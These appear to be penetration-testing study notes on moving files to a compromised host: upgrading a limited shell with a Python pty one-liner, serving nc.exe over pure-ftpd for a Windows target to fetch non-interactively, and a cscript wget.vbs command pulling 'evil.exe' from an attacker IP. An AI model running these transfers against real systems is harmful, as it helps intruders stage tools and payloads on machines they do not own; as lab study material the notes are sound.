do not install new tool, use native tools

# pure-ftpd
//install on kali
sudo apt update && sudo apt-y install pure-ftpd

# non-interactive shells
lack job control, su support, etc. or any feedback on what we are doing

* ``ls`` command not interactive
* ``ftp`` is an interactive program (requires user interaction to complete)
* go get interactive shell:
``python -c "import pty;pty.spawn('/bin/bash')"``

# windows 
## File transfer via FTP
* in our kali place this binary: ``sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/``
* restart ftp: ``sudo systemctl restart pure-ftpd``
* on target windows system: transfer file of *ftp.txt* by typing: ``ftp -v -n -s:ftp.txt`` should be the kali ip, *kali* is the ftp pw in this file
* The ftp -s option accepts a text-based command list that effectively makes the client noninteractive.

## Windows Downloads Using Scripting Languages
* use (file)[scripts\filedownload\wget.vbs] to get download a file
* cpy the wget on linux by ``sudo cp /usr/share/windows-resources/binaries/wget.exe /var/www/html/``
* execute command ``cscript wget.vbs http://10.11.0.4/evil.exe evil.exe``


